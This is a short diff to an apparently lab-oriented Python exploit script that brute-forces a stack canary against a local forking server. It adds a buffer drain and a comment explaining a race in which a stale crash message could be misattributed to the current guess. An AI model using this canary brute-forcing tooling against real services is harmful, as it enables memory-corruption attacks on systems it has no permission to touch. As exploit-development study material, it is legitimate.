@@ -84,6 +84,16 @@ def _find_canary_offset(server: ForkingServer, search_max: int) -> int:
 
 
 def _smashes(server: ForkingServer, payload: bytes) -> bool:
+    # A slow-to-arrive "stack smashing" message from the *previous* guess
+    # can otherwise still be sitting in server.io's buffer when this
+    # guess's own recv() below runs, misattributing a stale crash to the
+    # current (possibly correct) byte — a race unlikely to matter under
+    # this project's slower QEMU devcontainer, but real on fast native
+    # hardware firing ~2000 guesses in quick succession. Draining
+    # non-blockingly right before sending narrows that window to (at
+    # worst) the gap between this line and the send below, rather than a
+    # full previous attempt's cycle time.
+    server.io.recv(timeout=0)
     io = remote("127.0.0.1", server.port)
     io.send(payload)
     data = server.io.recv(timeout=_ATTEMPT_RECV_TIMEOUT)
